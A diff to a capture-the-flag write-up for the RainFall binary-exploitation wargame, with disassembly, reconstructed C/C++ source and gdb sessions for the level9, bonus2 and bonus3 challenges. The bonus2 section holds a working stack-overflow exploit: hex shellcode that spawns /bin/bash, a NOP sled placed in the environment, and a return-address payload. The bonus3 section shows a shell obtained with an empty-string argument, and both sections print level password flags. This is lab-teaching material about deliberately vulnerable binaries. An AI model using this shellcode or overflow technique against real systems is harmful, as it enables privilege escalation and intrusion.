@@ -2226,16 +2226,77 @@ c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 
 - [`-d` output](http://ix.io/2eLJ)
 
-### ASM Interpretation
+### Equivalent CPP source code
 
-```asm
+```cpp
+class N {  // ebp+0x8
+public :
+	char annotation[100];  // ebp+0x8 + 0x4 | size : 0x64 (0x68 - 0x4)
+	int value;  // ebp+0x8 + 0x68
+	N(int val) : value(val) {}  // 0x080486f6
+	void	setAnnotation(char *str) {  // 0x0804870e
+		int len = strlen(str);
+		memcpy(annotation, str, len);
+	}
+	int		operator+(N const &rhs) {  // 0x0804873a
+		return value + rhs.value;
+	}
+	int		operator-(N const &rhs) {  // 0x0804874e
+		return value - rhs.value;
+	}
+};
 
+int		main(int ac, char **av)
+{
+	if (ac <= 1)
+		_exit(1);
+	N *a = new N(5);  // esp+0x1c
+	N *b = new N(6);  // esp+0x18
+	N *c = a;  // esp+0x14
+	N *d = b;  // esp+0x10
+	c->setAnnotation(av[1]);
+	return (*d + *c);
+}
 ```
-
-### Equivalent C source code
 
 ### Walktrough
 
+```
+# Crash avec pytnon 200
+```
+
+- We can see the program crashes with a lot of characters, let's grab a pattern from [this site](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to find the offset where the program crashes
+
+```
+level9@RainFall:~$ gdb ./level9
+...
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) info registers
+eax            0x41366441       1094083649
+ecx            0x67413567       1732326759
+edx            0x804a0d4        134521044
+ebx            0x804a078        134520952
+esp            0xbffff620       0xbffff620
+ebp            0xbffff648       0xbffff648
+esi            0x0      0
+edi            0x0      0
+eip            0x8048682        0x8048682 <main+142>
+eflags         0x210287 [ CF PF SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+```
+
+- By inputting the value of eax at the time the program crashes into the EIP value section of the website, we can see the crashing offset is `108`
+
+## todo
 
 ## Bonus0
 
@@ -2705,27 +2766,482 @@ $ cat /home/user/bonus2/.pass
 
 ## Bonus2
 
+- [`objdump -d` output](http://ix.io/2oZD)
+
+```bash
+bonus2@RainFall:~$ objdump -R ./bonus2
+
+./bonus2:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804994c R_386_GLOB_DAT    __gmon_start__
+0804995c R_386_JUMP_SLOT   memcmp
+08049960 R_386_JUMP_SLOT   strcat
+08049964 R_386_JUMP_SLOT   getenv
+08049968 R_386_JUMP_SLOT   puts
+0804996c R_386_JUMP_SLOT   __gmon_start__
+08049970 R_386_JUMP_SLOT   __libc_start_main
+08049974 R_386_JUMP_SLOT   strncpy
+```
+
 ### ASM Interpretation
+
+```asm
+Dump of assembler code for function main:
+   0x08048529 <+0>:	push   ebp
+   0x0804852a <+1>:	mov    ebp,esp
+   0x0804852c <+3>:	push   edi
+   0x0804852d <+4>:	push   esi
+   0x0804852e <+5>:	push   ebx
+   0x0804852f <+6>:	and    esp,0xfffffff0
+   0x08048532 <+9>:	sub    esp,0xa0 ; Allocate 0xa0 bytes on the stack (160)
+
+   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3 ; Compare the 1st argument of main (argc) with 3
+   0x0804853c <+19>:	je     0x8048548 <main+31> ; If it's equal go to main+31
+
+   0x0804853e <+21>:	mov    eax,0x1 ; Set eax to 1
+   0x08048543 <+26>:	jmp    0x8048630 <main+263> ; Goto main+263 (end)
+
+   0x08048548 <+31>:	lea    ebx,[esp+0x50] ; Set ebx to *(esp+0x50) (80th byte of stack)
+   0x0804854c <+35>:	mov    eax,0x0 ; Set eax to 0
+   0x08048551 <+40>:	mov    edx,0x13 ; Set edx to 0x13 (19)
+   0x08048556 <+45>:	mov    edi,ebx ; Set edi to ebx *(80th byte of the stack)
+   0x08048558 <+47>:	mov    ecx,edx ; Set ecx to edx
+   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax ; memset like operation -> https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do
+
+   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc] ; Set eax to *(ebp+0xc), 2nd argument of main() (argv)
+   0x0804855f <+54>:	add    eax,0x4 ; Add 4 to eax
+   0x08048562 <+57>:	mov    eax,DWORD PTR [eax] ; Set eax to the value pointed by it (argv[1])
+   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28 ; Set 0x28 as the 3rd argument of strncpy()
+   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax ; Set eax as the 2nd argument of strncpy()
+   0x08048570 <+71>:	lea    eax,[esp+0x50] ; Set eax to the value of the 80th byte of the stack
+   0x08048574 <+75>:	mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strncpy()
+   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt> ; Call strncpy(*(esp+0x50), argv[1], 0x28 (40))
+
+   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc] ; Set eax to *(ebp+0xc), 2nd argument of main() (argv)
+   0x0804857f <+86>:	add    eax,0x8 ; Add 8 to eax
+   0x08048582 <+89>:	mov    eax,DWORD PTR [eax] ; Set eax to the value pointed by it
+   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20 ; Set 0x20 as the 3rd argument of strncpy()
+   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax ; Set eax as the 2nd argument of strncpy()
+   0x08048590 <+103>:	lea    eax,[esp+0x50] ; Set eax to the value of *(esp+0x50)
+   0x08048594 <+107>:	add    eax,0x28 ; Add 0x28 (40) to eax
+   0x08048597 <+110>:	mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strncpy
+   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt> ; Call strncpy(*(esp+0x50) + 28, argv[2], 0x20 /* (32) */)
+
+   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738 ; (gdb) printf "%s", 0x8048738 -> "LANG"
+   0x080485a6 <+125>:	call   0x8048380 <getenv@plt> ; Call getenv("LANG")
+
+   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax ; Set *(esp+0x9c) to eax (return of getenv)
+   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0 ; Compare it to 0
+   0x080485ba <+145>:	je     0x8048618 <main+239> ; If equals, goto main+239
+
+   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2 ; Set 0x2 (2) as the 3rd argument of memcmp
+   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d ; Set 0x804873d as the 2nr argument of memcmp() (gdb) printf "%s", 0x804873d -> "fi"
+   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c] ; Set eax to *(esp+0x9c)
+   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of memcmp()
+   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt> ; Call memcmp(eax, "fi", 2);
+
+   0x080485db <+178>:	test   eax,eax ; Check if eax equals to 0
+   0x080485dd <+180>:	jne    0x80485eb <main+194> ; If not goto main+194
+
+   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1 ; Set 0x8049988 to 1
+   0x080485e9 <+192>:	jmp    0x8048618 <main+239> ; Goto main+239
+
+   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2 ; Set 3rd argument of memcmp to 0x2 (2)
+   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740 ; Set 2nd argument of memcmp to 0x8048740 (gdb) printf "%s", 0x8048740 -> "nl"
+   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c] ; Set eax to *(esp+0x9c)
+   0x08048602 <+217>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of memcmp
+   0x08048605 <+220>:	call   0x8048360 <memcmp@plt> ; Call memcmp(*(esp+0x9c), "nl", 2);
+
+   0x0804860a <+225>:	test   eax,eax ; Check if eax equals to 0
+   0x0804860c <+227>:	jne    0x8048618 <main+239> ; If not goto main+239
+
+   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2 ; Set 0x8049988 to 2
+
+   0x08048618 <+239>:	mov    edx,esp ; Set edx to esp
+   0x0804861a <+241>:	lea    ebx,[esp+0x50] ; Set ebx to *(esp+0x50)
+   0x0804861e <+245>:	mov    eax,0x13 ; Set eax to 0x13 (19)
+   0x08048623 <+250>:	mov    edi,edx ; Set edi to edx
+   0x08048625 <+252>:	mov    esi,ebx ; Set esi to ebx
+   0x08048627 <+254>:	mov    ecx,eax ; Set ecx to eax
+   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] ; https://stackoverflow.com/questions/27804852/assembly-rep-movs-mechanism equivalent to memcpy(edi, esi, 0x13)
+   0x0804862b <+258>:	call   0x8048484 <greetuser> ; Call greetuser()
+
+   0x08048630 <+263>:	lea    esp,[ebp-0xc] ; Free allocated bytes
+   0x08048633 <+266>:	pop    ebx
+   0x08048634 <+267>:	pop    esi
+   0x08048635 <+268>:	pop    edi
+   0x08048636 <+269>:	pop    ebp
+   0x08048637 <+270>:	ret
+End of assembler dump.
+
+Dump of assembler code for function greetuser:
+   0x08048484 <+0>:	push   ebp
+   0x08048485 <+1>:	mov    ebp,esp
+   0x08048487 <+3>:	sub    esp,0x58 ; Allocate 0x58 bytes on the stack (88)
+
+   0x0804848a <+6>:	mov    eax,ds:0x8049988 ; Set eax to the global variable
+   0x0804848f <+11>:	cmp    eax,0x1 ; Compare eax with 1
+   0x08048492 <+14>:	je     0x80484ba <greetuser+54> ; If equals, goto greetuser+54
+
+   0x08048494 <+16>:	cmp    eax,0x2 ; Compare eax with 2
+   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> ; If equals, goto greetuser+101
+
+   0x08048499 <+21>:	test   eax,eax ; Test if eax is equals to 0
+   0x0804849b <+23>:	jne    0x804850a <greetuser+134> ; If not goto greetuser+134
+
+   0x0804849d <+25>:	mov    edx,0x8048710 ; Set edx to 0x8048710 printf "%s", 0x8048710 -> "Hello "
+   0x080484a2 <+30>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
+   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx] ; Set ecx to edx
+   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx ; Set eax to ecx
+   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4] ; Set ecx to edx + 0x4 and add a 0 byte after it
+   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx ; Set *(eax + 0x4) to cx
+   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6] ; Set edx to edx + 0x6
+   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl ; Set eax + 0x6 to dl
+   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134> ; goto greetuser+134
+
+   0x080484ba <+54>:	mov    edx,0x8048717 ; Set edx to 0x8048717 printf "%s", 0x8048717 -> "Hyvää päivää "
+   0x080484bf <+59>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
+   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
+   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
+   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
+   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
+   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
+   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
+   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
+   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
+   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
+   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
+   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
+   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl ; strcpy equivalent
+   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134> ; goto greetuser+134
+
+   0x080484e9 <+101>:	mov    edx,0x804872a ; Set edx to 0x804872a printf "%s", 0x804872a -> "Goedemiddag! "
+   0x080484ee <+106>:	lea    eax,[ebp-0x48]
+   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
+   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
+   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
+   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
+   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
+   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
+   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
+   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx ; strcpy equivalent
+   0x08048509 <+133>:	nop
+
+   0x0804850a <+134>:	lea    eax,[ebp+0x8] ; Set eax to 1st argument of greetuser()
+   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax ; Set eax as 2nd argument of strcat
+   0x08048511 <+141>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
+   0x08048514 <+144>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of strcat
+   0x08048517 <+147>:	call   0x8048370 <strcat@plt> ; Call strcat(ebp-0x48, greetuser_1st_arg)
+
+   0x0804851c <+152>:	lea    eax,[ebp-0x48] ; Set eax to *(ebp-0x48) (16th byte of the stack)
+   0x0804851f <+155>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of puts
+   0x08048522 <+158>:	call   0x8048390 <puts@plt> ; Call puts(*(ebp-0x48))
+
+   0x08048527 <+163>:	leave
+   0x08048528 <+164>:	ret
+End of assembler dump.
+```
 
 ### Equivalent C code
 
+```c
+int		global_0x8049988 = 0;
+
+void	*greetuser(char *str)
+{
+	unsigned char   buf[88];
+
+	if (global_0x8049988 == 1)
+	{
+		strcpy(&buf[16], "Hyvää päivää ");
+	}
+	else if (global_0x8049988 == 2)
+	{
+		strcpy(&buf[16], "Goedemiddag! ");
+	}
+	else if (global_0x8049988 == 0)
+	{
+		strcpy(&buf[16], "Hello ");
+	}
+
+	strcat(&buf[16], str);
+
+	puts(&buf[16]);
+}
+
+int		main(int argc, char *argv[])
+{
+	char			*lang; // esp+0x9c
+	unsigned char	buf[156];
+
+	if (argc == 3)
+	{
+
+		memset(&buf[80], 0, 0x13 /* (19) */);
+
+		strncpy(&buf[80], argv[1], 0x28 /* (40) */);
+
+		strncpy(&buf[80] + 28, argv[2], 0x20 /* (32) */);
+
+		lang = getenv("LANG");
+		if (lang == NULL)
+		{
+			;
+		}
+		else
+		{
+			if (memcmp(lang, "fi", 2))
+			{
+				if (memcmp(lang, "nl", 2))
+				{
+					return (1);
+				}
+				else
+				{
+					global_0x8049988 = 0x2;
+				}
+			}
+			else 
+			{
+				global_0x8049988 = 0x1;
+			}
+		}
+
+		// main+239
+		memcpy(buf, &buf[80], 0x13 /* (19) */);
+		greetuser(argv[1]);
+	}
+	return (1);
+}
+
+```
+
 ### Walktrough
 
-```bash
+- Export LANG=nl to be sure we don't `return 1`
 
+```bash
+bonus2@RainFall:~$ export LANG=nl
+bonus2@RainFall:~$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag a a
+bonus2@RainFall:~$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag a
+Goedemiddag! Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Aa
+bonus2@RainFall:~$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Goedemiddag! Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Segmentation fault (core dumped)
+```
+
+- We can make the program segfault if we pass 2 big arguments with the env variable LANG=nl, at this point we've already won
+
+- Pass a pattern generated [here](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
+
+```bash
+bonus2@RainFall:~$ gdb ./bonus2
+(gdb) b main
+Breakpoint 1 at 0x804852f
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Breakpoint 1, 0x0804852f in main ()
+(gdb) c
+Continuing.
+Goedemiddag! Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+
+```
+
+- Get the offset of the address `0x38614137`: 23
+
+- Load a shellcode with a nopsled into the environment and get environment address
+
+```bash
+bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x
+52\x51\x53\x89\xe1\xcd\x80"')
+
+bonus2@RainFall:~$  gdb ./bonus2 --eval-command='b main' --eval-command='r' --eval-command='print *((char **)environ)' --eval-command='quit'
+...
+Breakpoint 1 at 0x804852f
+Starting program: /home/user/bonus2/bonus2
+
+Breakpoint 1, 0x0804852f in main ()
+$1 = 0xbfffe8c3 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22
+0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
+220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22
+0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
+220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+A debugging session is active.
+
+        Inferior 1 [process 2609] will be killed.
+```
+
+- Execute the shellcode by loading EIP on the nopsled
+
+```bash
+bonus2@RainFall:~$ python -c 'print(hex(0xbfffe8c3 + 512))'
+0xbfffeac3L
+
+bonus2@RainFall:~$ ./bonus2  $(python -c 'print "A" * 23 + "\xc3\xea\xff\xbf" + "A" * 255') $(python -c 'print "A" * 23 + "\xc3\xea\xff\xbf" + "A" * 255')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+bash-4.2$
+bash-4.2$ whoami
+bonus3
+bash-4.2$ pwd
+/home/user/bonus2
+bash-4.2$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 ```
 
 ## Bonus3 (end)
 
+- [`objdump -d` output](http://ix.io/2pEo)
+
 ### ASM Interpretation
 
+```asm
+Dump of assembler code for function main:
+   0x080484f4 <+0>:     push   ebp
+   0x080484f5 <+1>:     mov    ebp,esp
+   0x080484f7 <+3>:     push   edi
+   0x080484f8 <+4>:     push   ebx
+   0x080484f9 <+5>:     and    esp,0xfffffff0
+   0x080484fc <+8>:     sub    esp,0xa0
+
+   0x08048502 <+14>:    mov    edx,0x80486f0
+   0x08048507 <+19>:    mov    eax,0x80486f2
+   0x0804850c <+24>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048510 <+28>:    mov    DWORD PTR [esp],eax
+   0x08048513 <+31>:    call   0x8048410 <fopen@plt>
+
+   0x08048518 <+36>:    mov    DWORD PTR [esp+0x9c],eax
+   0x0804851f <+43>:    lea    ebx,[esp+0x18]
+   0x08048523 <+47>:    mov    eax,0x0
+   0x08048528 <+52>:    mov    edx,0x21
+   0x0804852d <+57>:    mov    edi,ebx
+   0x0804852f <+59>:    mov    ecx,edx
+   0x08048531 <+61>:    rep stos DWORD PTR es:[edi],eax
+   0x08048533 <+63>:    cmp    DWORD PTR [esp+0x9c],0x0
+   0x0804853b <+71>:    je     0x8048543 <main+79>
+
+   0x0804853d <+73>:    cmp    DWORD PTR [ebp+0x8],0x2
+   0x08048541 <+77>:    je     0x804854d <main+89>
+
+   0x08048543 <+79>:    mov    eax,0xffffffff
+   0x08048548 <+84>:    jmp    0x8048615 <main+289>
+
+   0x0804854d <+89>:    lea    eax,[esp+0x18]
+   0x08048551 <+93>:    mov    edx,DWORD PTR [esp+0x9c]
+   0x08048558 <+100>:   mov    DWORD PTR [esp+0xc],edx
+   0x0804855c <+104>:   mov    DWORD PTR [esp+0x8],0x42
+   0x08048564 <+112>:   mov    DWORD PTR [esp+0x4],0x1
+   0x0804856c <+120>:   mov    DWORD PTR [esp],eax
+   0x0804856f <+123>:   call   0x80483d0 <fread@plt>
+
+   0x08048574 <+128>:   mov    BYTE PTR [esp+0x59],0x0
+   0x08048579 <+133>:   mov    eax,DWORD PTR [ebp+0xc]
+   0x0804857c <+136>:   add    eax,0x4
+   0x0804857f <+139>:   mov    eax,DWORD PTR [eax]
+   0x08048581 <+141>:   mov    DWORD PTR [esp],eax
+   0x08048584 <+144>:   call   0x8048430 <atoi@plt>
+
+   0x08048589 <+149>:   mov    BYTE PTR [esp+eax*1+0x18],0x0
+   0x0804858e <+154>:   lea    eax,[esp+0x18]
+   0x08048592 <+158>:   lea    edx,[eax+0x42]
+   0x08048595 <+161>:   mov    eax,DWORD PTR [esp+0x9c]
+   0x0804859c <+168>:   mov    DWORD PTR [esp+0xc],eax
+   0x080485a0 <+172>:   mov    DWORD PTR [esp+0x8],0x41
+   0x080485a8 <+180>:   mov    DWORD PTR [esp+0x4],0x1
+   0x080485b0 <+188>:   mov    DWORD PTR [esp],edx
+   0x080485b3 <+191>:   call   0x80483d0 <fread@plt>
+
+   0x080485b8 <+196>:   mov    eax,DWORD PTR [esp+0x9c]
+   0x080485bf <+203>:   mov    DWORD PTR [esp],eax
+   0x080485c2 <+206>:   call   0x80483c0 <fclose@plt>
+
+   0x080485c7 <+211>:   mov    eax,DWORD PTR [ebp+0xc]
+   0x080485ca <+214>:   add    eax,0x4
+   0x080485cd <+217>:   mov    eax,DWORD PTR [eax]
+   0x080485cf <+219>:   mov    DWORD PTR [esp+0x4],eax
+   0x080485d3 <+223>:   lea    eax,[esp+0x18]
+   0x080485d7 <+227>:   mov    DWORD PTR [esp],eax
+   0x080485da <+230>:   call   0x80483b0 <strcmp@plt>
+
+   0x080485df <+235>:   test   eax,eax
+   0x080485e1 <+237>:   jne    0x8048601 <main+269>
+   0x080485e3 <+239>:   mov    DWORD PTR [esp+0x8],0x0
+   0x080485eb <+247>:   mov    DWORD PTR [esp+0x4],0x8048707
+   0x080485f3 <+255>:   mov    DWORD PTR [esp],0x804870a
+   0x080485fa <+262>:   call   0x8048420 <execl@plt>
+
+   0x080485ff <+267>:   jmp    0x8048610 <main+284>
+
+   0x08048601 <+269>:   lea    eax,[esp+0x18]
+   0x08048605 <+273>:   add    eax,0x42
+   0x08048608 <+276>:   mov    DWORD PTR [esp],eax
+   0x0804860b <+279>:   call   0x80483e0 <puts@plt>
+
+   0x08048610 <+284>:   mov    eax,0x0
+   0x08048615 <+289>:   lea    esp,[ebp-0x8]
+   0x08048618 <+292>:   pop    ebx
+   0x08048619 <+293>:   pop    edi
+   0x0804861a <+294>:   pop    ebp
+   0x0804861b <+295>:   ret
+End of assembler dump.
+```
+
 ### Equivalent C code
+
+```c
+int main(int ac,char **av)
+{
+  FILE *fs;
+  char pass[66];
+  char buff[65];
+
+  fs = fopen("/home/user/end/.pass","r");
+
+  if ((!fs) || (argc != 2))
+    return -1;
+
+  fread(pass, 1, 66, fs);
+  pass[atoi(av[1])] = 0;
+
+  fread(buff, 1, 65, fs);
+  fclose(fs);
+
+  if (strcmp(pass, av[1]) == 0)
+    execl("/bin/sh", "sh", 0);
+  else
+    puts(buff);
+
+  return 0;
+}
+```
 
 ### Walktrough
 
 ```bash
 
+As we can see the in asm code we have an execl call to "/bin/sh" with an if condition based on the result of strcmp
+
+- Let's try to make the result of strcmp equals to `0`
+
+```bash
+bonus3@RainFall:~$ ./bonus3 0 # Will not work as it has a value of 48
+
+
+bonus3@RainFall:~$ ./bonus3 ""
+$ whoami
+end
+$ pwd
+/home/user/bonus3
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
 ```
+
+Not the hardest level for sure
